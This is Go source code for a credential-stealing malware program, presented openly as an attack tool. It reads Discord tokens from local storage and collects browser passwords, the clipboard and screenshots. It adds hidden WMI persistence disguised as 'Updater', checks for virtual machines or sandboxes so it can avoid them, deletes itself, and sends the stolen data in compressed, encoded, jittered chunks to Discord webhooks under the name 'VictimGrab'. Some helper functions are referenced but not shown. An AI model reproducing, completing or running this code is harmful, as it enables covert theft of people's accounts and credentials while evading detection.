// Discord tokens (LevelDB parse)
func grabDiscordTokens() []string {
	var tokens []string
	appData := os.Getenv("APPDATA")
	paths := []string{"discord", "discordcanary", "discordptb"}
	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
	for _, p := range paths {
		leveldb := filepath.Join(appData, p, "Local Storage\\leveldb")
		filepath.Walk(leveldb, func(path string, info os.FileInfo, err error) error {
			if strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log") {
				data, _ := ioutil.ReadFile(path)
				matches := re.FindAllString(string(data), -1)
				tokens = append(tokens, matches...)
			}
			return nil
		})
	}
	// Dedup
	seen := make(map[string]bool)
	unique := []string{}
	for _, t := range tokens {
		if !seen[t] {
			seen[t] = true
			unique = append(unique, t)
		}
	}
	return unique
}

// Persistence - WMI (silent)
func addPersistence() {
	exe, _ := os.Executable()
	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='Updater';Query='SELECT * FROM Win32_VolumeChangeEvent';QueryLanguage='WQL'}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='Updater';CommandLine='%s'}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter;Consumer=$consumer}`, exe))
	cmd.Run()
}

// Self-delete
func selfDelete() {
	exe, _ := os.Executable()
	go func() {
		time.Sleep(5 * time.Minute)
		exec.Command("cmd", "/C", "ping 127.0.0.1 -n 30 > nul & del", exe).Run()
	}()
}

// Exfil - chunked, jitter, gzip
func exfil(data []byte, hooks []string) {
	gz := new(bytes.Buffer)
	w := gzip.NewWriter(gz)
	w.Write(data)
	w.Close()

	chunkSize := 1900000 // Discord limit safe
	for i := 0; i < len(gz.Bytes()); i += chunkSize {
		end := i + chunkSize
		if end > len(gz.Bytes()) {
			end = len(gz.Bytes())
		}
		chunk := gz.Bytes()[i:end]
		b64 := base64.StdEncoding.EncodeToString(chunk)

		payload := map[string]interface{}{
			"username": "VictimGrab",
			"embeds": []map[string]string{{
				"description": "```" + b64 + "```",
				"color":       "3447003",
			}},
		}
		jsonPayload, _ := json.Marshal(payload)

		for _, hook := range hooks {
			time.Sleep(time.Duration(randInt(30, 180)) * time.Second)
			http.Post(hook, "application/json", bytes.NewBuffer(jsonPayload))
		}
	}
}

func randInt(min, max int) int {
	b := make([]byte, 4)
	rand.Read(b)
	return min + int(binary.LittleEndian.Uint32(b)%uint32(max-min))
}

func main() {
	if isVMOrSandbox() {
		return
	}

	addPersistence()

	info := map[string]interface{}{
		"hostname": getHostname(),
		"screenshot": takeScreenshot(),
		"clipboard": getClipboard(),
		// ... more system info
	}

	creds := map[string]interface{}{
		"browser_passwords": grabChromePasswords(),
		"discord_tokens":    grabDiscordTokens(),
		// Roblox, Steam, WiFi, etc.
	}

	full := map[string]interface{}{
		"info":  info,
		"creds": creds,
		"time":  time.Now().UTC(),
	}

	jsonData, _ := json.Marshal(full)

	key := byte(0x69) // change per build
	hooks := getWebhooks(key)

	go exfil(jsonData, hooks)
	selfDelete()

	// Fake loop to stay alive
	for {
		time.Sleep(24 * time.Hour)
	}
}
